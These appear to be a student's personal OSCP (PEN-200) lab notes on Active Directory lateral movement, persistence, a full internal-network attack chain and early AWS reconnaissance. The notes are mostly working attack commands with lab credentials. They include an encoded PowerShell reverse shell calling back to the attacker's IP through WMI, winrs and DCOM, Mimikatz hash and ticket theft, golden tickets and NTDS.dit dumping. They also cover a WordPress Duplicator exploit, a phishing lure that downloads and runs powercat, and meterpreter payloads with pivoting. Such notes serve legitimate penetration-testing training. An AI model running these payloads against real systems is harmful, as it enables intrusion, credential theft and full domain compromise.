payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.205",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
##
>python3 encode.py
##
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
##
##In the Jeff user 
PS>$username = 'jen';
>$password = 'Nexus123!';
>$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
>$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>$Options = New-CimSessionOption -Protocol DCOM
>$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
>$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
>Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
kali>nc -nlvp 443
##Got shell
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
FILES04

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> whoami
corp\jen
#######
>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.216.75
>winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

```

### PsExec

PsExec is a very versatile tool that is part of the **SysInternals** suite developed by Mark Russinovich.

It is possible to misuse this tool for lateral movement, but three requisites must be met.

1. User that authenticates to the target machine needs to be part of the Admin local group.
2. ADMIN$ share must be available.
3. File and printer sharing has to be turned on.

```markdown
>xfreerdp /u:offsec /v:192.168.157.74 /p:lab /cert-ignore
>./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
>hostname
>whoami
```

### Pass the Hash

The *Pass the Hash* (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the user's plaintext password. Note that this will only work for servers or services using NTLM authentication, not for servers or services using Kerberos authentication. This lateral movement sub-technique is also mapped in the MITRE Framework under the Use Alternate Authentication Material general technique.

> First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments.
> 

```markdown
>/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.157.73
>hostname
>whoami
```

### Overpass the Hash

With [*overpass the hash*](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse an NTLM user hash to gain a full Kerberos [*Ticket Granting Ticket*](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT). Then we can use the TGT to obtain a [*Ticket Granting Service*](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS).

To demonstrate this, let’s assume we have compromised a workstation(or server) that jen has authenticated to. We’ll also assume that the machine is now caching their credentials (and therefore, their NTLM password hash).

```markdown
>xfreerdp /u:offsec /v:192.168.170.76 /p:lab /cert-ignore
PS-ADMIN>.\mimikatz.exe
>privilege::debug
>sekurlsa::logonpasswords
>sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
>klist (NO kerberos loaded)
>net use \\files04
>klist (kerberos loaded)
>cd C:\tools\SysinternalsSuite\
>.\PsExec.exe \\files04 cmd
>whoami (Jen)
>hostname (files04)
##Lab 2892D26CDF84D7A70E2EB3B9F05C425E 
>sekurlsa::pth /domain:corp.com /user:admiinistrator /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```

### Pass the Ticket

In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

The **Pass the Ticket attack** takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

In this scenario, we are going to abuse an already existing session of the user *dave*. The *dave* user has privileged access to the *backup* folder located on WEB04 whereas our logged-in user *jen* does not.

```markdown
>xfreerdp /u:jen /v:192.168.170.76 /p:Nexus123! /cert-ignore 
>whoami
>ls \\web04\backup (Access Denied)
mimicatz-admin>privilege::debug
>sekurlsa::tickets /export
C>dir *.kirbi (It will show recent accessed list of users)
mimicatz-admin>kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi (USed dave user)
C>klist
>ls \\web04\backup (Accessed the folder using dave access)
```

### DCOM - Distributed Component Object Model

In this section, we will insect a fairly recent lateral movement technique that exploits the DCOM and learn how it can be abused for lateral movement.

The Microsoft [*Component Object Model*](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680573(v=vs.85).aspx) (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to *Distributed Component Object Model* (DCOM) for interaction between multiple computers over a network.

Both [COM](https://en.wikipedia.org/wiki/Component_Object_Model) and [DCOM](https://en.wikipedia.org/wiki/Component_Object_Model) are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

```markdown
>xfreerdp /u:jen /v:192.168.170.74 /p:Nexus123! /cert-ignore
PS>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.170.73"))
>$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
##Open remote Desktop
>tasklist | findstr "calc" (Check calculator is opened or not for above command)
>$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
","7")
##Above command is  for getting reverse shell
```

## Active Directory Persistence

Understand general purpose of persistence techniques

1. Leverage golden tickets as a persistence attack
2. Learn about shadow copies and how can they be abused for persistence

### Golden Ticket

Returning to the explanation of Kerberos authentication, we’ll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. The secret key is the password hash of a domain user account called krbtgt.

If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also know as **golden tickets.**

Although this technique’s name resembles the Silver Ticket one that we encountered in the Attacking Authentication Module, Golden Tickets provide a more powerful attack vector. While Silver Tickets aim to forge a TGS to access a specific service, Golden Tickets give us permission to access the entire domain’s resources, as we’ll see shortly.

```markdown
>xfreerdp /u:jen /v:192.168.170.74 /p:Nexus123! /cert-ignore
PS-Admin>privilege::debug
>kerberos::purge
>kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
>misc::cmd
##Above command will open new cmd
>PsExec.exe \\dc1 cmd.exe
>hostname (dc1)
>whoami /groups (PArt of Admin group)
```

### Shadow Copies

A Shadow Copy, also known as Volume Shadow Service (VSS) is Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary **vshadow.exe** is offered as part of the Windows SDK.

  As domain admins, we can abuse the vshadow.exe utility to create a shadow copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we’ve obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

To start, we’ll connect as the jeffadmin domain admin user to the DC1 domain controller. Here we will launch an elevated command prompt and run the vshadow.exe utility with -nw options to disable writers, which speeds up backup creation and include the -p option to store the copy on disk.

```markdown
>xfreerdp /u:jeffadmin /v:192.168.203.70 /p:"BrouhahaTungPerorateBroom2023\!" /cert-ignore /d:corp.com
PS-admin>vshadow.exe -nw -p C:
>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
>reg.exe save hklm\system c:\system.bak
kali>impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### Capstone

**Capstone Exercise**: Once VM Group 3 is started, the domain *corp.com* has been modified. Log in as *leon* on CLIENT74 and use the techniques discussed in this Module to move laterally and get the flag on FILES04 Administrator's desktop.

```markdown
>xfreerdp /u:leon /v:192.168.217.74 /p:"HomeTaping199\!" /cert-ignore /d:corp.com
PS-admin>.\mimikatz.exe
>privilege::debug
>sekurlsa::logonpasswords
##offsec(2892d26cdf84d7a70e2eb3b9f05c425e), jeffadmin(e460605a9dbd55097c6cf77af2f89a03)
Remote desktop from 74> 73 (leon credentials)
1. **Capstone Exercise**: Once VM Group 4 is started, the domain *corp.com* has been modified. Log in as the *leon* user on CLIENT76 and use the techniques discussed in this Module to move laterally and get the flag in the WEB04 shared folder.
```

**Capstone Exercise**: Once VM Group 4 is started, the domain *corp.com* has been modified. Log in as the *leon* user on CLIENT76 and use the techniques discussed in this Module to move laterally and get the flag in the WEB04 shared folder.

```markdown
>xfreerdp /u:leon /v:192.168.217.76 /p:HomeTap199! /cert-ignore 
>whoami
>ls \\web04\backup (Access Denied)
mimicatz-admin>privilege::debug
>sekurlsa::tickets /export
C>dir *.kirbi (It will show recent accessed list of users)
mimicatz-admin>kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi (USed dave user)
C>klist
>ls \\web04\backup (Accessed the folder using dave access)
```

# 24 Assembling the Pieces

PEN-200 Transferring file from Windows machine to local Kali VM

[Discord - Group Chat That’s All Fun & Games](https://discord.com/channels/780824470113615893/1148907181480104028)

In this Learning Module, we will cover the following Learning Units:

- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

![Untitled](Untitled%2086.png)

## Enumerating the Public Networks - mailsrv1, websrv1

```markdown
##Mail Server
>mkdir beyond
>cd beyond
>mkdir mialsrv1
>mkdir websrv1
>touch creds.txt
>sudo namp -sC -sV -oN mailsrv1/namp 192.168.240.242 (# check web server on the browser and cve details)
>gobuster dir -u http://192.168.240.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
##Web Server
>sudo nmap -sC -sV 192.168.240.244 -oN websrv1/Nmap_websrv1
>whatweb http://192.168.240.244/
>wpscan --url http://192.168.240.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

## Attacking a Public Machine

 WordPress instance: *akismet*,[6](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-public-network-48809/websrv1-48796#fn-local_id_380-6) *classic-editor*,[7](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-public-network-48809/websrv1-48796#fn-local_id_380-7) *contact-form-7*,[8](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-public-network-48809/websrv1-48796#fn-local_id_380-8) *duplicator* ,[9](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-public-network-48809/websrv1-48796#fn-local_id_380-9) *elementor*,[10](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-public-network-48809/websrv1-48796#fn-local_id_380-10) and *wordpress-seo*.[11](https://portal.offsec.com/courses/pen-200-44065/learning/assembling-the-pieces-48786/enumerating-the-public-network-48809/websrv1-48796#fn-local_id_380-11)

```markdown
>searchsploit -m duplicator
>searchsploit -m 50420
>python3 50420.py http://192.168.50.244 /etc/passwd
##Retriving SSH keys for the user
>python3 50420.py http://192.168.240.244 /home/daniela/.ssh/id_rsa
>chmod +600 id_rsa
>ssh2john id_rsa > ssh.hash
>john --wordlist=rockyou.txt ssh.hash(#daniela:tequieromucho)
>ssh -i id_rsa daniela@192.168.240.244  (tequieromucho)
>python3 -m http.server 80
>wget http://192.168.119.5/linpeas.sh
>chmod a+x ./linpeas.sh
>./linpeas.sh
>sudo -l (#git will run without sudo)
>sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help (Not allowed)
>sudo git -p help config (#ENTER !/bin/bash)
##Got root access
>cd /srv/www/wordpress/
>git status
>git log 
>git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1 
##Database Creds pasted on john:dqsTwTpZPn#nL

```

## Gaining Access to the Internal Network

- Domain Credentials
- Phishing for Access

**Phishing for Access** - In this section, we'll perform a client-side attack by sending a phishing e-mail. Throughout this course, we've mainly discussed two client-side attack techniques: Microsoft Office documents containing Macros and Windows Library files in combination with shortcut files.

Because we don't have any information about the internal machines or infrastructure, we'll choose the second technique as Microsoft Office may not be installed on any of the target systems.

For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.

> *We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.*
> 

```markdown
#Domain Credentials
>crackmapexec smb 192.168.240.242 -u users.txt -p passwords.txt --continue-on-success
##john:dqsTwTpZPn#nL 
>crackmapexec smb 192.168.208.242 -u john -p "dqsTwTpZPn#nL" --shares
##CrackMapExec only identified the default shares(Admin, C$, IPC$) on which we have no actionable permissions.
#Phishing for Access
>mkdir /home/kali/beyond/webdav
## config.Library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url> #kali IP
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
##config.Library-ms

##copythis config.Library-ms into kali working directory
>/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
>sudo service ssh start
>scp .\config.Library-ms kali@192.168.45.242:/home/kali/Desktop/HTB/OSCP/AD/beyond/
#Inter below command on windows shortcut name itinstall
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1'); powercat -c 192.168.45.224 -p 4444 -e powershell"
>nc -nlvp 4444
>sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach config.Library-ms --server 192.168.208.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
nc -nlvp 4444>whoami
>hostname
>ipconfig 
#172.16.120.243
```

### Enumerating Internal Network

```markdown
>iwr -uri http://192.168.45.224:8000/winPEASx64.exe -Outfile winPEAS.exe
>iwr -uri http://192.168.45.224:8000/SharpHound.ps1 -Outfile SharpHound.ps1
>. .\SharpHound.ps1
>Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\marcus\Desktop\
>scp 20240713164242_BloodHound.zip kali@192.168.45.224:/home/kali/Desktop/HTB/OSCP/AD/beyond
##Not working above command
SMB Transfer
kali>impacket-smbserver test . -smb2support  -username kourosh -password kourosh
WIN>net use m: \\192.168.45.242\home\kali\Desktop\HTB\OSCP\AD\beyond /user:kourosh kourosh
WIN>copy 20240715135750_BloodHound.zip m:\
>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.242 LPORT=443 -f exe -o met.exe
>sudo msfconsole -q
>use multi/handler
>set payload windows/x64/meterpreter/reverse_tcp
>set LHOST 192.168.119.5
>set LPORT 443
>set ExitOnSession false
>run -j
>iwr -uri http://192.168.45.242:8000/met.exe -Outfile met.exe
>.\met.exe

msf>use multi/manage/autoroute
>set session 1
>run
>use auxiliary/server/socks_proxy
>set SRVHOST 127.0.0.1
>set VERSION 5
>run -j
kali>cat /etc/proxychains4.conf
#Add socks5 127.0.0.1 1080
>proxychains -q crackmapexec smb 172.16.120.240-241 172.16.120.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
>sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.120.240 172.16.120.241 172.16.120.254
>chmod a+x chisel
>./chisel server -p 8080 --reverse
>msf>session -i 1
>upload chisel.exe C:\\Users\\marcus\\chisel.exe
nc -nlvp 4444>chisel.exe client 192.168.45.242:8080 R:80:172.16.120.241:80
>proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
>cat /etc/hosts
#Add 127.0.0.1 internalsrv1.beyond.com

```

### Attacking an Internal Web Application

```markdown
>proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.120.240 beyond.com/john
>sudo hashcat -m 13100 daniela_krbtgt.hash /usr/share/wordlists/rockyou.txt --force (DANIelaRO123)
##Wordpress login creds
>$client = New-Object System.Net.Sockets.TCPClient("192.168.45.242",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
##UTF-16LE - encode - https://www.base64encode.org/
##put the base64 value in powershell
>sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
>whoami
>hostname
```

### Gaining Access to the Domain Controller

```markdown
>cd C:\Users\Administrator
>iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
>.\met.exe
##Will get Seesion 2 on meterpreter
>proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.120.240
WIN>whoami
>hostname
>ipconfig
WIN>iwr -uri http://192.168.45.242:8000/met.exe -Outfile met.exe
WIN>iwr -uri http://192.168.45.242:8000/mimikatz.exe -Outfile mimikatz.exe
KALI-MSFCONSOLE>.\met.exe
##Session 3 will be open
KALI-MSFCONSOLE>.\mimikatz.exe
##Got NTLM of Admin - 8480fa6ca85394df498139fe5ca02b95

```

# AWS Cloud Infrastructure - Enum

## Reconnaissance of Cloud Resources on the Internet

### Accessing the AWS lab

```jsx
#Adding Name server
>sudo nano /etc/resolv.conf
nameserver <IP> (# random everytime)
nameserver 1.1.1.1 
>host www.offseclab.io <IP>
>host www.offseclab.io (# It will set ip address)
#After setting those network adapter check it's working as expected or not accessing public web such as google
# Once the work is done restart the Networkmanger
>sudo systemctl restart NetworkManager
>cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 1.1.1.1
```

### **Domain and Subdomain Reconnaissance**

```jsx
>host -t ns offseclab.io
>whois awsdns-00.com | grep "Registrant Organization" (# It will give Amazon)
# It is very likely managed by AWS Route53
>host offseclab.io (#It provide IP)
>whois <IP> (#Enter IP provided above)
>whois <IP> | grep "OrgName" (#Enter IP provided above)
# Provided by Amazonaws
>dnsenum offseclab.io --threads 100 
#Find subdomains
>dnsrecon -d offseclab.io (# FOund flg)
```

### Service-specific Domains

Custom URL convention displaying the resources

![image.png](image.png)

```jsx
>web>www.offseclab.io
#Developer option(F12), then Network tab Refresh below check the files section some files S3 AWS
#Open image in new tab
